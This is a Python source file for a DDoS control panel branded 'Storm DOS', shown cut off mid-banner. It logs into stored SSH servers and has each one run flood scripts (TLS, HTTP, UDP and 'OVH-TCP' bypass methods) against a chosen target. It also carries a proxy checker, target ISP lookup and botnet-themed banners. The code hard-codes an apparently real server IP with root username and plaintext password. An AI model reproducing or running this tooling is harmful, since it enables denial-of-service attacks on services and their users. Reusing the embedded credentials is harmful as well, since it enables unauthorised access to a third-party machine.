import socket
import os
import subprocess
import requests
import random
import getpass
import time
import sys
import threading
import json
import paramiko
from queue import Queue
from pystyle import Colors, Colorate

DEFAULT_CONFIG = {
    "theme": "default",
    "threads": 50,
    "timeout": 10,
    "retry_attempts": 3
}

THEMES = {
    "default": {"gradient": Colors.blue_to_purple, "attack_msg": "⚡⚡ Attack launched via {host}:{port} ⚡⚡", "help_msg": "⚡ Standard Storm DOS Help Menu ⚡", "error_gradient": Colors.red_to_purple},
    "mirai": {"gradient": Colors.green_to_blue, "attack_msg": "🌐 Mirai Botnet: Target acquired at {host}:{port} 🌐", "help_msg": "🌐 Mirai Control Network Online 🌐", "error_gradient": Colors.red_to_green},
    "qbot": {"gradient": Colors.yellow_to_red, "attack_msg": "💀 Qbot Strike: {host}:{port} under siege 💀", "help_msg": "💀 Qbot Command Grid Activated 💀", "error_gradient": Colors.red_to_yellow},
    "darknet": {"gradient": Colors.purple_to_blue, "attack_msg": "🕷 Darknet Assault: {host}:{port} infiltrated 🕷", "help_msg": "🕷 Darknet Ops Hub Initiated 🕷", "error_gradient": Colors.red_to_purple},
    "stormx": {"gradient": Colors.cyan_to_blue, "attack_msg": "🌩 StormX Thunder: {host}:{port} electrified 🌩", "help_msg": "🌩 StormX Nexus Online 🌩", "error_gradient": Colors.red_to_blue},
    "neon": {"gradient": Colors.blue_to_green, "attack_msg": "💡 Neon Pulse hitting {host}:{port} 💡", "help_msg": "💡 Neon Grid Activated 💡", "error_gradient": Colors.red_to_blue},
    "cyberpunk": {"gradient": Colors.purple_to_red, "attack_msg": "🏮 Cyberpunk Overload on {host}:{port} 🏮", "help_msg": "🏮 Cyberpunk Core Online 🏮", "error_gradient": Colors.red_to_purple},
    "matrix": {"gradient": Colors.green_to_black, "attack_msg": "💾 Matrix Code raining on {host}:{port} 💾", "help_msg": "💾 Matrix System Online 💾", "error_gradient": Colors.red_to_green},
    "ghost": {"gradient": Colors.white_to_blue, "attack_msg": "👻 Ghost Protocol active on {host}:{port} 👻", "help_msg": "👻 Ghost Network Online 👻", "error_gradient": Colors.red_to_white},
    "vortex": {"gradient": Colors.blue_to_red, "attack_msg": "🌀 Vortex Strike spinning at {host}:{port} 🌀", "help_msg": "🌀 Vortex Command Center 🌀", "error_gradient": Colors.red_to_blue},
    "phoenix": {"gradient": Colors.red_to_yellow, "attack_msg": "🔥 Phoenix Flames burning {host}:{port} 🔥", "help_msg": "🔥 Phoenix Reborn Online 🔥", "error_gradient": Colors.red_to_yellow},
    "quantum": {"gradient": Colors.purple_to_blue, "attack_msg": "⚛ Quantum Burst targeting {host}:{port} ⚛", "help_msg": "⚛ Quantum Network Active ⚛", "error_gradient": Colors.red_to_purple},
    "solar": {"gradient": Colors.yellow_to_red, "attack_msg": "☀ Solar Flare hitting {host}:{port} ☀", "help_msg": "☀ Solar Grid Online ☀", "error_gradient": Colors.red_to_yellow},
    "blizzard": {"gradient": Colors.white_to_blue, "attack_msg": "❄ Blizzard Storm freezing {host}:{port} ❄", "help_msg": "❄ Blizzard Network Online ❄", "error_gradient": Colors.red_to_white},
    "nova": {"gradient": Colors.blue_to_white, "attack_msg": "💫 Nova Blast targeting {host}:{port} 💫", "help_msg": "💫 Nova Network Active 💫", "error_gradient": Colors.red_to_blue},
    "galaxy": {"gradient": Colors.purple_to_blue, "attack_msg": "🌌 Galaxy Wave hitting {host}:{port} 🌌", "help_msg": "🌌 Galaxy Command Online 🌌", "error_gradient": Colors.red_to_purple},
    "ragnarok": {"gradient": Colors.red_to_black, "attack_msg": "⚔ Ragnarok Assault on {host}:{port} ⚔", "help_msg": "⚔ Ragnarok System Active ⚔", "error_gradient": Colors.red_to_black},
    "chaos": {"gradient": Colors.red_to_purple, "attack_msg": "🌀 Chaos Wave crashing {host}:{port} 🌀", "help_msg": "🌀 Chaos Control Active 🌀", "error_gradient": Colors.red_to_purple},
    "toxic": {"gradient": Colors.green_to_yellow, "attack_msg": "☣ Toxic Cloud on {host}:{port} ☣", "help_msg": "☣ Toxic System Online ☣", "error_gradient": Colors.red_to_green},
    "venom": {"gradient": Colors.green_to_black, "attack_msg": "🐍 Venom Strike on {host}:{port} 🐍", "help_msg": "🐍 Venom Network Active 🐍", "error_gradient": Colors.red_to_green},
    "aether": {"gradient": Colors.blue_to_white, "attack_msg": "✨ Aether Pulse on {host}:{port} ✨", "help_msg": "✨ Aether Grid Active ✨", "error_gradient": Colors.red_to_blue},
    "abyss": {"gradient": Colors.black_to_blue, "attack_msg": "🌊 Abyss Tide on {host}:{port} 🌊", "help_msg": "🌊 Abyss Command Online 🌊", "error_gradient": Colors.red_to_black},
    "inferno": {"gradient": Colors.red_to_yellow, "attack_msg": "🌋 Inferno Eruption at {host}:{port} 🌋", "help_msg": "🌋 Inferno Command Active 🌋", "error_gradient": Colors.red_to_yellow},
    "eclipse": {"gradient": Colors.blue_to_purple, "attack_msg": "🌑 Eclipse Shadow on {host}:{port} 🌑", "help_msg": "🌑 Eclipse Network Online 🌑", "error_gradient": Colors.red_to_purple},
    "stealth": {"gradient": Colors.green_to_black, "attack_msg": "🗡️ Stealth Strike on {host}:{port} 🗡️", "help_msg": "🗡️ Stealth Ops Active 🗡️", "error_gradient": Colors.red_to_green},
    "plasma": {"gradient": Colors.blue_to_red, "attack_msg": "⚡ Plasma Surge at {host}:{port} ⚡", "help_msg": "⚡ Plasma Grid Online ⚡", "error_gradient": Colors.red_to_blue}
}

def load_config():
    if os.path.exists('config.json'):
        with open('config.json', 'r') as f:
            return json.load(f)
    return DEFAULT_CONFIG

def save_config(config):
    with open('config.json', 'w') as f:
        json.dump(config, f, indent=4)

def create_default_servers():
    if not os.path.exists('servers.json'):
        servers_data = {
            "servers": [
                {"host": "34.122.130.109", "port": 22, "username": "root", "password": "Eralp13092012"}
            ]
        }
        with open('servers.json', 'w') as f:
            json.dump(servers_data, f, indent=4)
        print(Colorate.Horizontal(Colors.blue_to_purple, "⚡⚡ Created default servers.json ⚡⚡"))

class ProxyChecker:
    def __init__(self, proxy_list, threads=50, timeout=10):
        self.proxy_list = proxy_list
        self.working_proxies = []
        self.queue = Queue()
        self.threads = threads
        self.test_url = "https://discord.com"
        self.timeout = timeout
        
    def check_proxy(self, proxy):
        try:
            start_time = time.time()
            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            print(f"Checking {proxy}...")
            response = requests.get(self.test_url, proxies=proxies, timeout=self.timeout)
            if response.status_code == 200:
                response_time = time.time() - start_time
                print(f"                 Success: {proxy}                 ")
                return (proxy, response_time)
            print(f"                 Failed: {proxy}                 ")
            return None
        except Exception:
            print(f"                 Failed: {proxy}                 ")
            return None

    def worker(self):
        while True:
            try:
                proxy = self.queue.get_nowait()
            except:
                break
            result = self.check_proxy(proxy)
            if result:
                self.working_proxies.append(result)
            self.queue.task_done()

    def check_proxies(self):
        for proxy in self.proxy_list:
            self.queue.put(proxy)
        threads = [threading.Thread(target=self.worker) for _ in range(min(self.threads, len(self.proxy_list)))]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        self.working_proxies.sort(key=lambda x: x[1])
        return self.working_proxies

    def save_results(self, filename):
        with open(filename, "w") as f:
            for proxy, _ in self.working_proxies:
                f.write(f"{proxy}\n")

class SSHChecker:
    def __init__(self, ssh_list, threads=50, timeout=10, retries=3):
        self.ssh_list = ssh_list
        self.valid_ssh = []
        self.queue = Queue()
        self.threads = threads
        self.timeout = timeout
        self.retries = retries
        
    def check_ssh(self, ssh_info):
        for attempt in range(self.retries):
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                print(Colorate.Horizontal(current_theme["gradient"], f"                 Checking SSH {ssh_info['host']}:{ssh_info['port']} (Attempt {attempt+1}/{self.retries})...                 "))
                ssh.connect(
                    ssh_info['host'],
                    port=ssh_info['port'],
                    username=ssh_info['username'],
                    password=ssh_info.get('password'),
                    key_filename=ssh_info.get('key_path'),
                    timeout=self.timeout,
                    banner_timeout=30,
                    auth_timeout=30
                )
                ssh.close()
                print(Colorate.Horizontal(current_theme["gradient"], f"                 Success: {ssh_info['host']}:{ssh_info['port']}                 "))
                return ssh_info
            except paramiko.SSHException as e:
                print(Colorate.Horizontal(current_theme["error_gradient"], f"                 Failed: {ssh_info['host']}:{ssh_info['port']} - {str(e)}                 "))
                if attempt + 1 == self.retries:
                    return None
                time.sleep(1)

    def worker(self):
        while True:
            try:
                ssh_info = self.queue.get_nowait()
            except:
                break
            result = self.check_ssh(ssh_info)
            if result:
                self.valid_ssh.append(result)
            self.queue.task_done()

    def check_servers(self):
        for ssh in self.ssh_list:
            self.queue.put(ssh)
        threads = [threading.Thread(target=self.worker) for _ in range(min(self.threads, len(self.ssh_list)))]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        return self.valid_ssh

def load_ssh_servers():
    global valid_ssh_servers
    try:
        with open('servers.json', 'r') as f:
            ssh_servers = json.load(f)['servers']
        checker = SSHChecker(ssh_servers, config["threads"], config["timeout"], config["retry_attempts"])
        valid_ssh_servers = checker.check_servers()
        return len(valid_ssh_servers)
    except FileNotFoundError:
        print(Colorate.Horizontal(current_theme["error_gradient"], "⚡⚡ Error: servers.json not found! ⚡⚡"))
        return 0
    except json.JSONDecodeError:
        print(Colorate.Horizontal(current_theme["error_gradient"], "⚡⚡ Error: Invalid JSON in servers.json! ⚡⚡"))
        return 0

def animation():
    global valid_ssh_count
    valid_ssh_count = load_ssh_servers()
    clear()
    for i in range(5):
        print(Colorate.Horizontal(current_theme["gradient"], f"⚡⚡ Storm DOS - Initializing | Valid SSH Servers: {valid_ssh_count}" + "." * i))
        time.sleep(0.3)
        clear()
    print(Colorate.Horizontal(current_theme["gradient"], "⚡⚡ Wait... ⚡⚡"))
    time.sleep(0.3)
    print(Colorate.Horizontal(current_theme["gradient"], "⚡⚡ Completed! ⚡⚡"))

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxy.txt').readlines() if os.path.exists('proxy.txt') else []
bots = len(proxys)

def si():
    print(Colorate.Diagonal(current_theme["gradient"], f"⚡ STORM DOS v2.1 ⚡ | Operator: root | Tier: Overlord  | SSH Servers: {valid_ssh_count} | Dominate the Grid"))
    print("")

def get_provider_info(host):
    try:
        ip = socket.gethostbyname(host.replace("https://", "").replace("http://", "").split("/")[0])
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        if data["status"] == "success":
            return data["as"], data["country"], Colorate.Horizontal(current_theme["gradient"], f"""
                                                                    
                                        ╔════════════════════ PROVIDER INTEL ════════════════════╗
                                         ⚡ Target Grid:       {host:<30}
                                         ⚡ IP Signature:      {ip:<30}
                                         ⚡ ISP:               {data["isp"][:30]:<30}
                                         ⚡ ASN:               {data["as"][:30]:<30}
                                         ⚡ Region:            {data["regionName"][:30]:<30} 
                                         ⚡ Country:           {data["country"][:30]:<30}
                                        ╚════════════════════ GRID ONLINE ══════════════════════╝
                                      
""")
        return "", "", Colorate.Horizontal(current_theme["error_gradient"], "⚡⚡ PROVIDER DATA CORRUPTED ⚡⚡")
    except:
        return "", "", Colorate.Horizontal(current_theme["error_gradient"], " ")

def attack_server(ssh_server, method, target, duration, port=None):
    for attempt in range(config["retry_attempts"]):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(
                ssh_server['host'],
                port=ssh_server['port'],
                username=ssh_server['username'],
                password=ssh_server.get('password'),
                key_filename=ssh_server.get('key_path'),
                timeout=config["timeout"],
                banner_timeout=30,
                auth_timeout=30
            )
            if method == "STORM-TLS":
                cmd = f"node STORM-TLS.js GET {target} {duration} 5 16 checked.txt"
            elif method == "HTTPS":
                cmd = f"node http-flood.js {target} {duration} 10"
            elif method == "TLSV1":
                cmd = f"node bypass.js {target} {duration} 16 10 checked.txt"
            elif method == "OVH-TCP":
                cmd = f"perl ovh.pl {target} {port} 65500 {duration} 800"
            elif method == "UDP-FLOOD":
                cmd = f"node ovh.js {target} {port} 25 {duration}"
            else:
                ssh.close()
                return f"⚡⚡ Unknown method on {ssh_server['host']}:{ssh_server['port']} ⚡⚡", None
            stdin, stdout, stderr = ssh.exec_command(cmd)
            print(Colorate.Horizontal(current_theme["gradient"], current_theme["attack_msg"].format(host=ssh_server['host'], port=ssh_server['port'])))
            time.sleep(int(duration))
            output = stdout.read().decode()
            errors = stderr.read().decode()
            ssh.close()
            return None, (output, errors)
        except paramiko.SSHException as e:
            error_msg = f"⚡⚡ SSH Error on {ssh_server['host']}:{ssh_server['port']} (Attempt {attempt+1}/{config['retry_attempts']}): {str(e)} ⚡⚡"
            if attempt + 1 == config["retry_attempts"]:
                return error_msg, None
            time.sleep(1)

def launch_attack(method, target, duration, port=None):
    clear()
    si()
    print(Colorate.Horizontal(current_theme["gradient"], f"""
                             ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⢔⣒⠂⣀⣀⣤⣄⣀⠀⠀
                             ⠀⠀⠀⠀⠀⠀⠀⣴⣿⠋⢠⣟⡼⣷⠼⣆⣼⢇⣿⣄⠱⣄
                             ⠀⠀⠀⠀⠀⠀⠀⠹⣿⡀⣆⠙⠢⠐⠉⠉⣴⣾⣽⢟⡰⠃
                             ⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣦⠀⠤⢴⣿⠿⢋⣴⡏⠀⠀
                             ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡙⠻⣿⣶⣦⣭⣉⠁⣿⠀⠀⠀
                             ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠈⠉⠉⠉⠉⠇⡟⠀⠀⠀
                             ⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⣘⣦⣀⠀⠀⣀⡴⠊⠀⠀⠀⠀
                             ⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⢻⣿⣿⣿⣿⠻⣧⡀⠀⠀⠀
                             ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠫⣿⠉⠻⣇⠘⠓⠂⠀⠀
                             ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀
                             ⠀⢶⣾⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀
                             ⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣧⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀
                             ⠀⠀⠀⠈⠙⠻⢿⣿⣿⠿⠛⣄⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀
                             ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡇  
                   Attack requested to the selected network!
          ╘═══════════════════════════════════════════════════════════╛
                              
                  Server       >   [{valid_ssh_count}]
                  Target       >   [{target}]     
                  Time         >   [{duration}]    
                  Method       >   [{method}]    
                  Requested by >   [user]  
                  {'Port         >   [' + port + ']' if port else ''}
                  
           ╚═════════════════════════════════════════════════════════╝
        ╘══╦═╦═════════════════════════════════════════════════════╦═╦══╛
           ║X║    Storm / Storm / Storm / Storm / Storm / Storm    ║X║
           ╚═╩═════════════════════════════════════════════════════╩═╝
"""))
    if not valid_ssh_servers:
        print(Colorate.Horizontal(current_theme["error_gradient"], "⚡⚡ Error: No valid SSH servers available! ⚡⚡"))
        return
    threads = []
    results = []
    for ssh_server in valid_ssh_servers:
        t = threading.Thread(target=lambda: results.append(attack_server(ssh_server, method, target, duration, port)))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    for error, output in results:
        if error:
            print(Colorate.Horizontal(current_theme["error_gradient"], error))
        elif output:
            out, err = output
            if out:
                print(Colorate.Horizontal(current_theme["gradient"], f"Output: {out}"))
            if err:
                print(Colorate.Horizontal(current_theme["error_gradient"], f"Errors: {err}"))
    print(Colorate.Horizontal(current_theme["gradient"], "⚡⚡ All attack sequences completed ⚡⚡"))

def ping_host(host):
    try:
        host = host.replace("https://", "").replace("http://", "").split("/")[0]
        response = os.system(f"ping {host} -n 4" if os.name == 'nt' else f"ping {host} -c 4")
        return "⚡ Target is alive ⚡" if response == 0 else "⚡ Target is down or unreachable ⚡"
    except:
        return "⚡ Ping failed ⚡"

def METHODS():
    clear()
    si()
    banner = '''
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀⠀⠀⠀⠀⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀⠀⠀⠀⠀⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀⠀⠀⠀⠀⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀⠀⠀⠀⠀⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀ 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⚡ METHODS OVERDRIVE ⚡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    '''
    print(Colorate.Horizontal(current_theme["gradient"], banner))
    print(Colorate.Horizontal(current_theme["gradient"], '''                   
    🧨 Layer 7 Methods:
                              
    ⚡ STORM-TLS  - Ultimate TLS annihilation     [Layer 7 | BASIC]
    ⚡ TLSV1      - Precision TLSv1 devastation   [Layer 7 | BASIC]
    ⚡ HTTPS      - HTTP/1.1 shockwave            [Layer 7 | STANDARD]

    🧨 Layer 4 Methods:
                                                  
    ⚡ UDP-FLOOD  - UDP packet storm              [Layer 4 | STANDARD] 
    ⚡ OVH-TCP    - Flooder bypass firewall       [Layer 4 | STANDARD]                    
                                                       
    ⚡ SYNTAX Layer 7: [METHOD] [URL] [TIME]
    ⚡ EXAMPLE Layer 7: STORM-TLS https://target.com 120
                              
    ⚡ SYNTAX Layer 4: [METHOD] [IP] [PORT] [TIME]
    ⚡ EXAMPLE Layer 4: OVH-TCP 1.1.1.1 80 120
                              
    '''))

def ports():
    clear()
    si()
    banner = '''
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⠿⠛⠋⠉⠙⠻⢿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣷⣤⣀⠀⠀⣀⣴⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⚡ PORT MATRIX ⚡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    '''
    print(Colorate.Horizontal(current_theme["gradient"], banner))
    print(Colorate.Horizontal(current_theme["gradient"], ''' 
    ⚡ 21   - FTP (File Transfer Protocol)
    ⚡ 22   - SSH (Secure Shell)
    ⚡ 23   - Telnet
    ⚡ 80   - HTTP (Web Traffic)
    ⚡ 443  - HTTPS (Secure Web Traffic)
    ⚡ 3389 - RDP (Remote Desktop Protocol)
    '''))

def utils():
    clear()
    si()
    banner = '''
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⠿⠛⠋⠙⠿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡇⠀⠀⠀⠀⠀⢸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣄⠀⠀⠀⢠⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣷⣤⣾⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⚡ UTILITY GRID ⚡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    '''
    print(Colorate.Horizontal(current_theme["gradient"], banner))
    print(Colorate.Horizontal(current_theme["gradient"], ''' 
    ⚡ PROVIDER - Extract ISP, IP, and zone intel
    ⚡ PORTS    - Access port matrix intel
    ⚡ IPGEN    - Generate random IP for testing
    ⚡ CLS      - Clear terminal interface
    ⚡ PING     - Ping target host
    ⚡ THEME    - Switch themes 

                              
    '''))

def menu():
    clear()
    print(Colorate.Diagonal(current_theme["gradient"], f"⚡ STORM DOS v2.1 ⚡ | Operator: root | Tier: Overlord | SSH Servers: {valid_ssh_count} | Dominate the Grid"))
    print("")
    banner = '''
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠾⡎⣿⣦⣠⡾⣧
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡏⣟⡃⣶⣶⣾⣗⠀⡿⣠⣶⣶⣶⠂⠀⠀⠀⢀⣠⡶⠞⠛⠛⠲
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡶⢿⡇⣿⡁⠀⢸⡆⠀⣫⠴⠋⠀⠀⠀⣠⠞⠋⠁⠀⠀⠀⠀⠀⣹
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣈⣙⠬⠛⡌⠳⣄⠘⠃⠈⢈⣿⠟⢁⡴⠋⠀⠀⠀⠀⣰⠋⠀⠀⢠⠇
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠾⣿⣦⣤⠤⡆⡀⢰⢀⣺⡛⢋⠵⠊⠁⠀⠀⠀⠀⠀⠀⠘⠷⠤⠖⠁
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡤⠤⣀⠀⠀⠀⠀⣼⣿⣧⠏⠫⢼⡏⠁
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠁⠀⠀⠀⠉⢦⡀⠀⠻⠛⠁⠀⠀⢸⠇⠀⠀⠀⠀⠀⢀⣠⣄⡀
